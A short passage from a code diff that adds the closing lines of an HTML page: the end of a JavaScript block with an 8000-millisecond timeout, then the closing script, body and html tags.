+            }, 8000);
+        }
+    });
+</script>
+
+</body>
+</html>
